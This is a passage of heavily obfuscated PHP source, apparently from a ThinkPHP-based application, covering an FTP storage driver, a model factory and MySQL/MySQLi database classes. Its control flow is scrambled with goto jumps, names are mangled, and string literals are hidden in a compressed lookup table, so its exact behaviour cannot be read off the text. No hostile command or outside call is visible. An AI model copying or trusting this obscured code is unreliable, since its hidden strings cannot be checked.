fileSubstr($f…§â»ˆŒâ, $AÛ¼à§ÅËå = 0, $E˜Í™ôÆ©É = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f…§â»ˆŒâ, $AÛ¼à§ÅËå, $E˜Í™ôÆ©É); } private function ftpRequest($aø¬ğè¿ò, $C’ãˆÖŸ¢ = 0, $e¯§²ƒó½ä = false) { goto d…“•ö×õ; aÕ¯ØÍæÂ…: curl_setopt($C‘ò¯²òĞÇ, CURLOPT_RETURNTRANSFER, 1); $F‰×‚ÍÈ²à = curl_exec($C‘ò¯²òĞÇ); curl_close($C‘ò¯²òĞÇ); goto bÍ´…éÀÍó; bÍ´…éÀÍó: return $F‰×‚ÍÈ²à; goto aƒÊ²‚¨; d…“•ö×õ: $aø¬ğè¿ò = $this->iconvSystem($aø¬ğè¿ò); $e×ºô¥Ê¸¡ = $this->scheme . $this->host . $_SERVER[©][14] . $this->port; $C‘ò¯²òĞÇ = curl_init(); goto DõÔÖ©Õ¼; DõÔÖ©Õ¼: curl_setopt($C‘ò¯²òĞÇ, CURLOPT_URL, $e×ºô¥Ê¸¡ . $this->pathEncode($aø¬ğè¿ò)); curl_setopt($C‘ò¯²òĞÇ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($e¯§²ƒó½ä) { $d™ê×Ã«Õê = $C’ãˆÖŸ¢ + $e¯§²ƒó½ä - 1; curl_setopt($C‘ò¯²òĞÇ, CURLOPT_RANGE, "{$C’ãˆÖŸ¢}\55{$d™ê×Ã«Õê}"); } goto aÕ¯ØÍæÂ…; aƒÊ²‚¨: } public function upload($bœÇµ¨È, $DìËÆ…ñá, $CîÇÈÃ¸Ù = false, $E’¹Ê›‡šÔ = REPEAT_REPLACE) { goto DØ…ÀÁ†¬; Eâ‘å™µ: $DìËÆ…ñá = $this->iconvSystem($DìËÆ…ñá); $fÉì™İ§‹É = ftp_nb_put($this->connect, $bœÇµ¨È, $DìËÆ…ñá, FTP_BINARY); while ($fÉì™İ§‹É == FTP_MOREDATA) { $fÉì™İ§‹É = ftp_nb_continue($this->connect); } goto c‘ÀŸãÅÔ“; DØ…ÀÁ†¬: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($bœÇµ¨È))) { return !1; } $bœÇµ¨È = $this->iconvSystem($bœÇµ¨È); goto Eâ‘å™µ; c‘ÀŸãÅÔ“: if ($fÉì™İ§‹É != FTP_FINISHED) { return !1; } return $this->getPathOuter($bœÇµ¨È); goto FŠÃª²£™Ò; FŠÃª²£™Ò: } public function download($cêÜòÙ‚ˆ, $D¦¦Éª‚ß = '') { goto a‘ÊÙ…¾ğ­; C¿Á©ÇÛ…£: $cêÜòÙ‚ˆ = $this->iconvSystem($cêÜòÙ‚ˆ); $D¦¦Éª‚ß = $this->iconvSystem($D¦¦Éª‚ß); $eòà‰éĞ´‚ = ftp_nb_get($this->connect, $D¦¦Éª‚ß, $cêÜòÙ‚ˆ, FTP_BINARY); goto DÖ©šåØ…¨; a‘ÊÙ…¾ğ­: if (!$this->_isconn()) { return !1; } $eóäåø‹Ÿò = $this->pathFather($D¦¦Éª‚ß); if (!IO::mkdir($eóäåø‹Ÿò)) { return !1; } goto C¿Á©ÇÛ…£; DÖ©šåØ…¨: while ($eòà‰éĞ´‚ == FTP_MOREDATA) { $eòà‰éĞ´‚ = ftp_nb_continue($this->connect); } if ($eòà‰éĞ´‚ != FTP_FINISHED) { return !1; } return $this->iconvApp($D¦¦Éª‚ß); goto A‡¶ëÒ–’í; A‡¶ëÒ–’í: } private function ftpList($eäÚ¤ñ³¾Ò) { goto B•’–ª®ó; F”‰ ğòê: $eäÚ¤ñ³¾Ò = rtrim($eäÚ¤ñ³¾Ò, $aßŠ²ğ°¥í[18]) . $aßŠ²ğ°¥í[18]; $d¥ô“äîÁ = @ftp_nlist($this->connect, $eäÚ¤ñ³¾Ò); if ($d¥ô“äîÁ === !1) { $d¥ô“äîÁ = @ftp_rawlist($this->connect, $eäÚ¤ñ³¾Ò); foreach ($d¥ô“äîÁ as $c‚‡Ÿ´„ => $cÛëÑó†å) { $d¥ô“äîÁ[$c‚‡Ÿ´„] = end(explode($aßŠ²ğ°¥í[1161], $cÛëÑó†å)); } } goto b±¶Œ®¥¯Š; BíÍ´è±Ôì: return $EµÅçß×ê; goto b•¥²êêÃ°; b±¶Œ®¥¯Š: $d¥ô“äîÁ = array_diff($d¥ô“äîÁ, array($aßŠ²ğ°¥í[101], $aßŠ²ğ°¥í[1162], $eäÚ¤ñ³¾Ò . $aßŠ²ğ°¥í[101], $eäÚ¤ñ³¾Ò . $aßŠ²ğ°¥í[1162])); $EµÅçß×ê = array(); foreach ($d¥ô“äîÁ as $B ‡Ş•¨æ‘) { if (!strstr($B ‡Ş•¨æ‘, $aßŠ²ğ°¥í[18])) { $B ‡Ş•¨æ‘ = $eäÚ¤ñ³¾Ò . ltrim($B ‡Ş•¨æ‘, $aßŠ²ğ°¥í[18]); } $EµÅçß×ê[] = $this->iconvApp($B ‡Ş•¨æ‘); } goto BíÍ´è±Ôì; B•’–ª®ó: $aßŠ²ğ°¥í =& $_SERVER[©]; if (!$this->isFolder($eäÚ¤ñ³¾Ò)) { return !1; } @ftp_chdir($this->connect, $aßŠ²ğ°¥í[18]); goto F”‰ ğòê; b•¥²êêÃ°: } private function recursionFtpFiles($f˜éÈ§Ã™, &$díá»Ë‹Œ) { $có†Æ£Œâ¥ =& $_SERVER[©]; if (!$this->_isconn()) { return !1; } if (!($Fö÷èİ‘ë = $this->ftpList($f˜éÈ§Ã™))) { return !1; } foreach ($Fö÷èİ‘ë as $f˜éÈ§Ã™) { if ($this->isFolder($f˜éÈ§Ã™)) { $this->recursionFtpFiles($f˜éÈ§Ã™, $díá»Ë‹Œ); $díá»Ë‹Œ[$có†Æ£Œâ¥[84]][] = $f˜éÈ§Ã™; } else { $díá»Ë‹Œ[$có†Æ£Œâ¥[83]][] = $f˜éÈ§Ã™; } } } private function objectMeta($FÏ¿¦ĞĞá) { goto dáÀŒ¨•®Û; EÅ¦Ÿ³©†®: if ($C‰†Œåƒßõ !== null && $C‰†Œåƒßõ !== !1) { return $C‰†Œåƒßõ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $E‹¨Û¸÷…‘[18]); goto e¥‚²¥¸Â; e¥‚²¥¸Â: $CÉˆäõ³Ñ = @ftp_size($this->connect, $this->iconvSystem($FÏ¿¦ĞĞá)); if ($CÉˆäõ³Ñ != -1) { $C‰†Œåƒßõ = array($E‹¨Û¸÷…‘[87] => $CÉˆäõ³Ñ, $E‹¨Û¸÷…‘[39] => $E‹¨Û¸÷…‘[177]); } else { $F‘˜àİ¢õ = @ftp_chdir($this->connect, $this->iconvSystem($FÏ¿¦ĞĞá)); $C‰†Œåƒßõ = $F‘˜àİ¢õ ? array($E‹¨Û¸÷…‘[87] => 0, $E‹¨Û¸÷…‘[39] => $E‹¨Û¸÷…‘[86]) : !1; } Cache::set($aßº¸…ñœÕ, $C‰†Œåƒßõ, 0); goto e‡ÄÕ¾³Ôà; e‡ÄÕ¾³Ôà: return $C‰†Œåƒßõ; goto bƒÂÀï×˜É; dáÀŒ¨•®Û: $E‹¨Û¸÷…‘ =& $_SERVER[©]; $aßº¸…ñœÕ = $E‹¨Û¸÷…‘[1163] . md5($FÏ¿¦ĞĞá); $C‰†Œåƒßõ = Cache::get($aßº¸…ñœÕ); goto EÅ¦Ÿ³©†®; bƒÂÀï×˜É: } } goto e…ãÚè­İÑ; aèóĞÀ×¥Å: define($_SERVER[©][0], $_SERVER[©][1]); $_SERVER[ÊÖŠ] = explode($_SERVER[©][2], gzinflate(substr($_SERVER[©][3], 10, -8))); function Model($Aî…±‡÷º³ = '', $b·‚È¢ÒÒš = '', $F›ó“Í¨°’ = '') { goto dÒÕšÇãóÔ; D—»´â‘ªç: $föà²ÑÆ¶™[$F¹À±Â‡·™] = new ModelBase($Aî…±‡÷º³, $b·‚È¢ÒÒš, $F›ó“Í¨°’); return $föà²ÑÆ¶™[$F¹À±Â‡·™]; goto F›¤ Ø–“Ì; dÒÕšÇãóÔ: $Eá¿Ïï =& $_SERVER[ÊÖŠ]; static $föà²ÑÆ¶™ = array(); $F¹À±Â‡·™ = strtolower($b·‚È¢ÒÒš . $Eá¿Ïï[0] . $Aî…±‡÷º³); goto aâŞ‘¤›Å±; aâŞ‘¤›Å±: if (isset($föà²ÑÆ¶™[$F¹À±Â‡·™])) { return $föà²ÑÆ¶™[$F¹À±Â‡·™]; } if ($Aî…±‡÷º³) { $Aî…±‡÷º³ = strtoupper($Aî…±‡÷º³[0]) . substr($Aî…±‡÷º³, 1); $dæÜßˆÑÕ = $Aî…±‡÷º³ . $Eá¿Ïï[1]; if (class_exists($dæÜßˆÑÕ)) { $föà²ÑÆ¶™[$F¹À±Â‡·™] = new $dæÜßˆÑÕ(); return $föà²ÑÆ¶™[$F¹À±Â‡·™]; } } if (!$F›ó“Í¨°’) { $F›ó“Í¨°’ = $GLOBALS[$Eá¿Ïï[2]][$Eá¿Ïï[3]]; } goto D—»´â‘ªç; F›¤ Ø–“Ì: } goto AÎììŠÅ¯‹; F¹éİ‘Úƒœ: class DbMysql extends Db { public function __construct($c½­Êß¨•œ = '') { $b•…ä§•«· =& $_SERVER[©]; if (!extension_loaded($b•…ä§•«·[727])) { think_exception(think_lang($b•…ä§•«·[20]) . $b•…ä§•«·[795]); } if (!empty($c½­Êß¨•œ)) { $this->config = $c½­Êß¨•œ; if (empty($this->config[$b•…ä§•«·[23]])) { $this->config[$b•…ä§•«·[23]] = $b•…ä§•«·[43]; } } } public function connect($b„®‘Ô³Šõ = '', $F¼ğí±‰× = 0, $aã»ÊÌ¸Û« = false) { $f–Úä––‘ =& $_SERVER[©]; if (!isset($this->linkID[$F¼ğí±‰×])) { goto f¡–¨×‹Ï¥; f¡–¨×‹Ï¥: if (empty($b„®‘Ô³Šõ)) { $b„®‘Ô³Šõ = $this->config; } $fĞ¬×À•¾’ = $b„®‘Ô³Šõ[$f–Úä––‘[796]] . ($b„®‘Ô³Šõ[$f–Úä––‘[797]] ? "\x3a{$b„®‘Ô³Šõ[$f–Úä––‘[797]]}" : $f–Úä––‘[43]); $c‘Úîö¾Ù = !empty($b„®‘Ô³Šõ[$f–Úä––‘[23]][$f–Úä––‘[24]]) ? $b„®‘Ô³Šõ[$f–Úä––‘[23]][$f–Úä––‘[24]] : $this->pconnect; goto BïŸ™‰‡óŒ; dë Ûò ˜Ÿ: mysql_query($f–Úä––‘[800] . think_config($f–Úä––‘[801]) . $f–Úä––‘[65], $this->linkID[$F¼ğí±‰×]); if ($CáîÁğÙ¤ > $f–Úä––‘[802]) { mysql_query($f–Úä––‘[803], $this->linkID[$F¼ğí±‰×]); } $this->connected = !0; goto F’Ï—˜ğ›; F’Ï—˜ğ›: if (1 != think_config($f–Úä––‘[28])) { unset($this->config); } goto CÏ»²Î‹¾; BïŸ™‰‡óŒ: if ($c‘Úîö¾Ù) { $this->linkID[$F¼ğí±‰×] = mysql_pconnect($fĞ¬×À•¾’, $b„®‘Ô³Šõ[$f–Úä––‘[798]], $b„®‘Ô³Šõ[$f–Úä––‘[799]], 131072); } else { $this->linkID[$F¼ğí±‰×] = mysql_connect($fĞ¬×À•¾’, $b„®‘Ô³Šõ[$f–Úä––‘[798]], $b„®‘Ô³Šõ[$f–Úä––‘[799]], !0, 131072); } if (!$this->linkID[$F¼ğí±‰×] || !empty($b„®‘Ô³Šõ[$f–Úä––‘[27]]) && !mysql_select_db($b„®‘Ô³Šõ[$f–Úä––‘[27]], $this->linkID[$F¼ğí±‰×])) { think_exception(mysql_error()); } $CáîÁğÙ¤ = mysql_get_server_info($this->linkID[$F¼ğí±‰×]); goto dë Ûò ˜Ÿ; CÏ»²Î‹¾: } return $this->linkID[$F¼ğí±‰×]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cê¾š—Ü¤œ) { goto EÍ£ƒ¡š’Ê; EÛí´±Æ¬«: think_action_status($A¦‹À ‰À´[29], 1); think_status($A¦‹À ‰À´[30]); $this->queryID = mysql_query($cê¾š—Ü¤œ, $this->_linkID); goto b—Ş¡È¦¥ä; b—Ş¡È¦¥ä: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto B»œàŞ–Û; EÍ£ƒ¡š’Ê: $A¦‹À ‰À´ =& $_SERVER[©]; if (0 === stripos($cê¾š—Ü¤œ, $A¦‹À ‰À´[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto EÖÒóå¶ƒ†; EÖÒóå¶ƒ†: if (!$this->_linkID) { return !1; } $this->queryStr = $cê¾š—Ü¤œ; if ($this->queryID) { $this->free(); } goto EÛí´±Æ¬«; B»œàŞ–Û: } public function execute($D¼ì¯öµÈˆ) { goto BçÖ©àÆôÑ; BçÖ©àÆôÑ: $aáÑëè¤Äø =& $_SERVER[©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fµ¥Û‡Å´¹; fµ¥Û‡Å´¹: $this->queryStr = $D¼ì¯öµÈˆ; if ($this->queryID) { $this->free(); } think_action_status($aáÑëè¤Äø[31], 1); goto cÛ‘ÌœÀ‰ˆ; d†ÖĞ¿ä¿: if (!1 === $bÌ©ğÒ‘Ú) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DÎòá¨ÊÌã; cÛ‘ÌœÀ‰ˆ: think_status($aáÑëè¤Äø[30]); $bÌ©ğÒ‘Ú = mysql_query($D¼ì¯öµÈˆ, $this->_linkID); $this->debug(); goto d†ÖĞ¿ä¿; DÎòá¨ÊÌã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[©][804], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÔˆš¡ ®ƒ = mysql_query($_SERVER[©][805], $this->_linkID); $this->transTimes = 0; if (!$CÔˆš¡ ®ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BË·Ïƒµ¦ = mysql_query($_SERVER[©][806], $this->_linkID); $this->transTimes = 0; if (!$BË·Ïƒµ¦) { $this->error(); return !1; } } return !0; } private function getAll() { $bÔâ¬ÙÒ´„ = array(); if ($this->numRows > 0) { while ($D¡“ö¿ã Ñ = mysql_fetch_assoc($this->queryID)) { $bÔâ¬ÙÒ´„[] = $D¡“ö¿ã Ñ; } mysql_data_seek($this->queryID, 0); } return $bÔâ¬ÙÒ´„; } public function getFields($a±Í÷„ù•) { $aá…ÍÉ®‰¤ =& $_SERVER[©]; $E¨Ë„÷®  = $this->query($aá…ÍÉ®‰¤[807] . $this->parseKey($a±Í÷„ù•)); $aÎÉëï•Ù« = array(); if ($E¨Ë„÷® ) { foreach ($E¨Ë„÷®  as $aÉî®ˆê†’ => $dåÂµøÂˆ¼) { $aÎÉëï•Ù«[$dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[37]]] = array($aá…ÍÉ®‰¤[38] => $dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[37]], $aá…ÍÉ®‰¤[39] => $dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[40]], $aá…ÍÉ®‰¤[41] => (bool) (strtoupper($dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[42]]) === $aá…ÍÉ®‰¤[808]), $aá…ÍÉ®‰¤[44] => $dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[45]], $aá…ÍÉ®‰¤[46] => strtolower($dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[47]]) == $aá…ÍÉ®‰¤[48], $aá…ÍÉ®‰¤[49] => strtolower($dåÂµøÂˆ¼[$aá…ÍÉ®‰¤[50]]) == $aá…ÍÉ®‰¤[51]); } } return $aÎÉëï•Ù«; } public function getTables($EÑØ“à—¤ = '') { $dî Œ»šÉ¼ =& $_SERVER[©]; if (!empty($EÑØ“à—¤)) { $c‡Ó›‚îº = $dî Œ»šÉ¼[809] . $EÑØ“à—¤; } else { $c‡Ó›‚îº = $dî Œ»šÉ¼[810]; } $f³ç¤†®Ğ¹ = $this->query($c‡Ó›‚îº); $b˜ÏÉ•÷¿ = array(); foreach ($f³ç¤†®Ğ¹ as $EÀÜ™å¦ÓÌ => $EíØâ‡ÑÏ¢) { $b˜ÏÉ•÷¿[$EÀÜ™å¦ÓÌ] = current($EíØâ‡ÑÏ¢); } return $b˜ÏÉ•÷¿; } public function replace($F¼¡òéâ¼Æ, $C˜³µ¨Ì”— = array()) { $CŠòÊãê¦À =& $_SERVER[©]; foreach ($F¼¡òéâ¼Æ as $CˆÃ¬Òæ’ø => $BÊ°•Ú§ç) { $b‚Âñ¯°¿ = $this->parseValue($BÊ°•Ú§ç); if (is_scalar($b‚Âñ¯°¿)) { $a­Áá—Âá[] = $b‚Âñ¯°¿; $eâÅ›¯‹´[] = $this->parseKey($CˆÃ¬Òæ’ø); } } $F•ÌÈà£†Ÿ = $CŠòÊãê¦À[811] . $this->parseTable($C˜³µ¨Ì”—[$CŠòÊãê¦À[276]]) . $CŠòÊãê¦À[812] . implode($CŠòÊãê¦À[57], $eâÅ›¯‹´) . $CŠòÊãê¦À[813] . implode($CŠòÊãê¦À[57], $a­Áá—Âá) . $CŠòÊãê¦À[814]; return $this->execute($F•ÌÈà£†Ÿ); } public function insertAll($BÊ¥¾£øÒÌ, $D¨‚÷ÖŞİĞ = array(), $eë”¸èíë• = false) { goto cÊÖÆ¶İôÙ; cÊÖÆ¶İôÙ: $cå¹ŠÊë–ä =& $_SERVER[©]; if (!is_array($BÊ¥¾£øÒÌ[0])) { return !1; } $A§ˆÁÀ£³¥ = array_keys($BÊ¥¾£øÒÌ[0]); goto bÈïáÁÀÚ; bÈïáÁÀÚ: $ağİ‰ŒÀÆ = array(); foreach ($BÊ¥¾£øÒÌ as $CŒï‘ùãŒ) { $fÛèƒ·¿å° = array(); foreach ($CŒï‘ùãŒ as $AÖ³²•ä˜ => $B”ÎÕ®—•“) { $B”ÎÕ®—•“ = $this->parseValue($B”ÎÕ®—•“); if (is_scalar($B”ÎÕ®—•“)) { $fÛèƒ·¿å°[] = $B”ÎÕ®—•“; } } $ağİ‰ŒÀÆ[] = $cå¹ŠÊë–ä[257] . implode($cå¹ŠÊë–ä[57], $fÛèƒ·¿å°) . $cå¹ŠÊë–ä[814]; } array_walk($A§ˆÁÀ£³¥, array($this, $cå¹ŠÊë–ä[815])); goto fòî´²˜›; fòî´²˜›: $CÕåÅçí¡¬ = ($eë”¸èíë• ? $cå¹ŠÊë–ä[816] : $cå¹ŠÊë–ä[817]) . $cå¹ŠÊë–ä[818] . $this->parseTable($D¨‚÷ÖŞİĞ[$cå¹ŠÊë–ä[276]]) . $cå¹ŠÊë–ä[812] . implode($cå¹ŠÊë–ä[57], $A§ˆÁÀ£³¥) . $cå¹ŠÊë–ä[819] . implode($cå¹ŠÊë–ä[57], $ağİ‰ŒÀÆ); return $this->execute($CÕåÅçí¡¬); goto d‰“Ôğ’¢›; d‰“Ôğ’¢›: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $cÆ¢‘š­… =& $_SERVER[©]; $this->error = mysql_errno() . $cÆ¢‘š­…[14] . mysql_error($this->_linkID); if ($cÆ¢‘š­…[43] != $this->queryStr) { $this->error .= LNG($cÆ¢‘š­…[55]) . $this->queryStr; } think_trace($this->error, $cÆ¢‘š­…[43], $cÆ¢‘š­…[56]); return $this->error; } public function escapeString($b¹‰§’§µ±) { if ($this->_linkID) { return mysql_real_escape_string($b¹‰§’§µ±, $this->_linkID); } else { return mysql_escape_string($b¹‰§’§µ±); } } public function parseKey(&$aª™ÃÔõ¸, $a‘Í¾ïíëÉ = true) { $d¹Û„¡ğš =& $_SERVER[©]; if ($a‘Í¾ïíëÉ) { $aª™ÃÔõ¸ = $this->parseKeyCheck($aª™ÃÔõ¸); } if ($aª™ÃÔõ¸ != $d¹Û„¡ğš[186] && !preg_match($d¹Û„¡ğš[820], $aª™ÃÔõ¸)) { $aª™ÃÔõ¸ = $d¹Û„¡ğš[821] . trim($aª™ÃÔõ¸, $d¹Û„¡ğš[821]) . $d¹Û„¡ğš[821]; } return $aª™ÃÔõ¸; } } class DbMysqli extends Db { public function __construct($f¬¬ê„Ë¾– = '') { $a›Ñİ–ĞÌø =& $_SERVER[©]; if (!extension_loaded($a›Ñİ–ĞÌø[726])) { think_exception(think_lang($a›Ñİ–ĞÌø[20]) . $a›Ñİ–ĞÌø[822]); } if (!empty($f¬¬ê„Ë¾–)) { $this->config = $f¬¬ê„Ë¾–; if (empty($this->config[$a›Ñİ–ĞÌø[23]])) { $this->config[$a›Ñİ–ĞÌø[23]] = $a›Ñİ–ĞÌø[43]; } } } public function connect($eÀõÛ™ÎÏó = '', $a˜™ÃêŸ‘÷ = 0) { $bÕÃ—Ìò³¹ =& $_SERVER[©]; if (!isset($this->linkID[$a˜™ÃêŸ‘÷])) { goto a«¬´¢áŞØ; a«¬´¢áŞØ: if (empty($eÀõÛ™ÎÏó)) { $eÀõÛ™ÎÏó = $this->config; } $this->linkID[$a˜™ÃêŸ‘÷] = new mysqli($eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[796]], $eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[798]], $eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[799]], $eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[27]], $eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[797]] ? intval($eÀõÛ™ÎÏó[$bÕÃ—Ìò³¹[797]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto b¨ŸÊùğˆ; fÒÑ—®ñË: $this->connected = !0; if (1 != think_config($bÕÃ—Ìò³¹[28])) { unset($this->config); } goto BàŒ±Ü‰é¡; b¨ŸÊùğˆ: $EÇ‡†­ô ä = $this->linkID[$a˜™ÃêŸ‘÷]->server_version; $this->linkID[$a˜™ÃêŸ‘÷]->query($bÕÃ—Ìò³¹[800] . think_config($bÕÃ—Ìò³¹[801]) . $bÕÃ—Ìò³¹[65]); if ($EÇ‡†­ô ä > $bÕÃ—Ìò³¹[802]) { $this->linkID[$a˜™ÃêŸ‘÷]->query($bÕÃ—Ìò³¹[803]); } goto fÒÑ—®ñË; BàŒ±Ü‰é¡: } return $this->linkID[$a˜™ÃêŸ‘÷]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($EÎ´­Ô½ŒÛ) { goto C²¸ª½´°; C²¸ª½´°: $A³¥óÖ¾ª® =& $_SERVER[©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B…¨‡ñÎ¾ø; B…¨‡ñÎ¾ø: $this->queryStr = $EÎ´­Ô½ŒÛ; if ($this->queryID) { $this->free(); } think_action_status($A³¥óÖ¾ª®[29], 1); goto FÚóÎ»í¼ì; bÉò™‹‹¿æ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto BĞ½’‹¶»Ã; FÚóÎ»í¼ì: think_status($A³¥óÖ¾ª®[30]); $this->queryID = $this->_linkID->query($EÎ´­Ô½ŒÛ); if ($this->_linkID->more_results()) { while (($b¯š¸öŠÌ± = $this->_linkID->next_result()) != NULL) { $b¯š¸öŠÌ±->free_result(); } } goto bÉò™‹‹¿æ; BĞ½’‹¶»Ã: } public function execute($Bƒ„Íòà°) { goto eÒò·™Ã; eÒò·™Ã: $f´ŸÄµëïà =& $_SERVER[©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÈæåÅõÕÁ; CÓÈ‡ø„²î: if (!1 === $FœºË¸†ö…) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto AÕëå»­; BŞ±Õ‹ç–â: think_status($f´ŸÄµëïà[30]); $FœºË¸†ö… = $this->_linkID->query($Bƒ„Íòà°); $this->debug(); goto CÓÈ‡ø„²î; BÈæåÅõÕÁ: $this->queryStr = $Bƒ„Íòà°; if ($this->queryID) { $this->free(); } think_action_status($f´ŸÄµëïà[31], 1); goto BŞ±Õ‹ç–â; AÕëå»­: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eñ‚š‰¿ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Eñ‚š‰¿ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b§æˆøíÇ† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b§æˆøíÇ†) { $this->error(); return !1; } } return !0; } private function getAll() { $bƒ•˜÷¶ˆ° = array(); if ($this->numRows > 0) { for ($Eİ¡Õ£…¸å = 0; $Eİ¡Õ£…¸å < $this->numRows; $Eİ¡Õ£…¸å++) { $bƒ•˜÷¶ˆ°[$Eİ¡Õ£…¸å] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $bƒ•˜÷¶ˆ°; } public function getFields($FĞ«Úœªœ÷) { $Bµ‰…£åî¼ =& $_SERVER[©]; $A¡½ìà±ø‚ = $this->query($Bµ‰…£åî¼[807] . $this->parseKey($FĞ«Úœªœ÷)); $bï‰ç– æç = array(); if ($A¡½ìà±ø‚) { foreach ($A¡½ìà±ø‚ as $CĞÁö¬…Ö‡ => $bÀÜ…†à) { $bï‰ç– æç[$bÀÜ…†à[$Bµ‰…£åî¼[37]]] = array($Bµ‰…£åî¼[38] => $bÀÜ…†à[$Bµ‰…£åî¼[37]], $Bµ‰…£åî¼[39] => $bÀÜ…†à[$Bµ‰…£åî¼[40]], $Bµ‰…£åî¼[41] => (bool) ($bÀÜ…†à[$Bµ‰…£åî¼[42]] === $Bµ‰…£åî¼[43]), $Bµ‰…£åî¼[44] => $bÀÜ…†à[$Bµ‰…£åî¼[45]], $Bµ‰…£åî¼[46] => strtolower($bÀÜ…†à[$Bµ‰…£åî¼[47]]) == $Bµ‰…£åî¼[48], $Bµ‰…£åî¼[49] => strtolower($bÀÜ…†à[$Bµ‰…£åî¼[50]]) == $Bµ‰…£åî¼[51]); } } return $bï‰ç– æç; } public function getTables($a­àç™Ù = '') { $F±„ŠªŞÃ® =& $_SERVER[©]; $bÊŸùÈÚ” = !empty($a­àç™Ù) ? $F±„ŠªŞÃ®[809] . $a­àç™Ù : $F±„ŠªŞÃ®[810]; $aÁÀÒİ¶Ú« = $this->query($bÊŸùÈÚ”); $C”ÚÍ¥¦¼ = array(); if ($aÁÀÒİ¶Ú«) { foreach ($aÁÀÒİ¶Ú« as $B‹Œ‡¸Ëï => $Cñ¦™¾±Ë™) { $C”ÚÍ¥¦¼[$B‹Œ‡¸Ëï] = current($Cñ¦™¾±Ë™); } } return $C”ÚÍ¥¦¼; } public function replace($C®„ÃÓ³£Ê, $dœÜ¹Û‡³ = array()) { $DÀ‘¨ÚÃÎ =& $_SERVER[©]; foreach ($C®„ÃÓ³£Ê as $cÁ•î‘ÙŒé => $e½ê»ØàŒè) { $bëœïôÛÙ = $this->parseValue($e½ê»ØàŒè); if (is_scalar($bëœïôÛÙ)) { $A‘¼‘ƒÕ…ä[] = $bëœïôÛÙ; $a®‘Œ«Çõ[] = $this->parseKey($cÁ•î‘ÙŒé); } } $dî¤„·µÄ = $DÀ‘¨ÚÃÎ[811] . $this->parseTable($dœÜ¹Û‡³[$DÀ‘¨ÚÃÎ[276]]) . $DÀ‘¨ÚÃÎ[812] . implode($DÀ‘¨ÚÃÎ[57], $a®‘Œ«Çõ) . $DÀ‘¨ÚÃÎ[813] . implode($DÀ‘¨ÚÃÎ[57], $A‘¼‘ƒÕ…ä) . $DÀ‘¨ÚÃÎ[814]; return $this->execute($dî¤„·µÄ); } public function insertAll($EÀÒµ—Æ‘, $F°½¾¥‡ÁÏ = array(), $C¨©ˆ§ãŸî = false) { goto a’¸ë‡Ğ‹ª; f¤×áœëµ: $c¯¸äÁ©¦ = array(); foreach ($EÀÒµ—Æ‘ as $EïõÛƒà–’) { $dóøÅñÔæŞ = array(); foreach ($EïõÛƒà–’ as $fê¥†¥İ˜ => $dŞÊ‡ˆÅ—·) { $dŞÊ‡ˆÅ—· = $this->parseValue($dŞÊ‡ˆÅ—·); if (is_scalar($dŞÊ‡ˆÅ—·)) { $dóøÅñÔæŞ[] = $dŞÊ‡ˆÅ—·; } } $c¯¸äÁ©¦[] = $c‚›Ö•·‰[257] . implode($c‚›Ö•·‰[57], $dóøÅñÔæŞ) . $c‚›Ö•·‰[814]; } array_walk($C¯öÓÈô, array($this, $c‚›Ö•·‰[815])); goto a ‚‘ï¿…¿; a’¸ë‡Ğ‹ª: $c‚›Ö•·‰ =& $_SERVER[©]; if (!is_array($EÀÒµ—Æ‘[0])) { return !1; } $C¯öÓÈô = array_keys($EÀÒµ—Æ‘[0]); goto f¤×áœëµ; a ‚‘ï¿…¿: $eå‘õ»°ªÊ = ($C¨©ˆ§ãŸî ? $c‚›Ö•·‰[816] : $c‚›Ö•·‰[817]) . $c‚›Ö•·‰[818] . $this->parseTable($F°½¾¥‡ÁÏ[$c‚›Ö•·‰[276]]) . $c‚›Ö•·‰[812] . implode($c‚›Ö•·‰[57], $C¯öÓÈô) . $c‚›Ö•·‰[819] . implode($c‚›Ö•·‰[57], $c¯¸äÁ©¦); return $this->execute($eå‘õ»°ªÊ); goto d¹ÚŠìæ¯; d¹ÚŠìæ¯: } public function 